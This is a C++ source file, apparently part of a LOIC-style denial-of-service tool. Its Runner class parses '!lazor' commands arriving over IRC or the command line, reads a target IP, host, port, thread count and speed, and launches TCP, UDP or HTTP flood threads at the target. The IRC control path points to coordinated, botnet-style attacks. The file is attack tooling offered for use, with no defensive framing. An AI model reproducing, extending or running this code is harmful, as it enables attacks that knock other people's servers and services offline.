#include "runner.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <iostream>
#include <iterator>

#include "defines.h"
#include "iflooder.h"
#include "xxpflooder.h"
#include "httpflooder.h"

#ifndef stricmp
#define stricmp strcasecmp
#endif // stricmp

Runner::Runner()
	: arThreads(NULL)
	, pIp(NULL)
	, pHost(NULL)
	, pURLChain(NULL)
	, pMessage(NULL)
	, pMethod(NULL)
	, pSrcHost(NULL)
	, iTimeout(0)
	, iPort(80)
	, iSrcPort(11111)
	, iThreads(10)
	, iSpeed(0)
	, bWait(true)
	, bRandom(false)
	, bDefault(false)
{
}

Runner::~Runner()
{
	if (pIp) free(pIp);
	if (pHost) free(pHost);
	if (pURLChain) free(pURLChain);
	if (pMessage) free(pMessage);
	if (pMethod) free(pMethod);
	if (pSrcHost) free(pSrcHost);

	pIp = NULL;
	pHost = NULL;
	pURLChain = NULL;
	pMessage = NULL;
	pMethod = NULL;
	pSrcHost = NULL;

	if (arThreads)
	{
		for (int i = 0; i < iThreads; i++)
		{
			delete arThreads[i];
			arThreads[i] = NULL;
		}
		free(arThreads);
		arThreads = NULL;
		iThreads = 0;
	}
}

void Runner::Stop()
{
	if (arThreads)
	{
		for (int i = 0; i < iThreads; i++)
		{
			delete arThreads[i];
			arThreads[i] = NULL;
		}
		free(arThreads);
		arThreads = NULL;
		iThreads = 0;
	}
}

void Runner::Execute(const char *command)
{
	using namespace std;

	if (!command)
		return;

	string type1("!lazor"); // irc
	string type2("lazor"); // cli

	istringstream iss(command);
	vector<string> tokens;
	copy(istream_iterator<string>(iss), istream_iterator<string>(), back_inserter<vector<string> >(tokens));

	if (type1.compare(tokens.at(0)) != 0 && type2.compare(tokens.at(0)) != 0)
		return;

	vector<string>::iterator it = tokens.begin();
	vector<string>::iterator end = tokens.end();
	it++;

	bool start = false;
	for (; it != end; it++)
	{
		const char *parm = (*it).c_str();

		const char *name = strtok(const_cast<char *>(parm), "=");
		const char *val = strtok(NULL, "\0");

		if (val) { DBG("PARAM: %s -> %s\n", name, val); }
		else { DBG("PARAM: %s\n", name); }

		if (stricmp(name, "targetip") == 0)
		{
			if (pIp) free(pIp);
			pIp = strdup(val);
		}
		else if (stricmp(name, "targethost") == 0)
		{
			if (pHost) free(pHost);
			pHost = strdup(val);
		}
		else if (stricmp(name, "timeout") == 0)
		{
			iTimeout = atoi(val);
		}
		else if (stricmp(name, "subsite") == 0)
		{
			if (pURLChain) free(pURLChain);
			pURLChain = strdup(val);
		}
		else if (stricmp(name, "message") == 0)
		{
			if (pMessage) free(pMessage);
			pMessage = strdup(val);
		}
		else if (stricmp(name, "port") == 0)
		{
			iPort = atoi(val);
			if (!iPort) iPort = 80;
		}
		else if (stricmp(name, "method") == 0)
		{
			if (pMethod) free(pMethod);
			pMethod = strdup(val);
		}
		else if (stricmp(name, "threads") == 0)
		{
			iThreads = atoi(val);
			if (!iThreads) iThreads = 10;
		}
		else if (stricmp(name, "wait") == 0)
		{
			bWait = stricmp(val, "true") == 0 ? true : false;
		}
		else if (stricmp(name, "random") == 0)
		{
			bRandom = stricmp(val, "true") == 0 ? true : false;
		}
		else if (stricmp(name, "speed") == 0)
		{
			iSpeed = atoi(val);
		}
		else if (stricmp(name, "start") == 0)
		{
			start = true;
		}
		else if (stricmp(name, "stop") == 0)
		{
			this->Stop();
		}
		else if (stricmp(name, "default") == 0)
		{
			bDefault = true;
		}
		else if (stricmp(name, "srchost") == 0)
		{
			if (pSrcHost) free(pSrcHost);
			pSrcHost = strdup(val);
		}
		else if (stricmp(name, "srcport") == 0)
		{
			iSrcPort = atoi(val);
			if (!iSrcPort) iSrcPort = 11111;
		}
	}

	if (!pMessage)
	{
		pMessage = strdup("Hello%20World");
	}

	if (start)
	{
		this->Stop();

		LOG("info: starting flood type %s.\n", pMethod);

		arThreads = (IFlooder **)malloc(sizeof(IFlooder *) * iThreads);
		for (int i = 0; i < iThreads; i++)
		{
			if (stricmp(pMethod, "tcp") == 0 || !pMethod)
			{
				arThreads[i] = new XXPFlooder(i, pIp, iPort, iSpeed, pHost, 0, pMessage, bRandom);
			}
			else if (stricmp(pMethod, "udp") == 0)
			{
				arThreads[i] = new XXPFlooder(i, pIp, iPort, iSpeed, pHost, 1, pMessage, bRandom); 
			}
			else if (stricmp(pMethod, "http") == 0)
			{
				arThreads[i] = new HTTPFlooder(i, pIp, iPort, iSpeed, pHost, pURLChain, bRandom, bWait);
			}
		}
	}
}

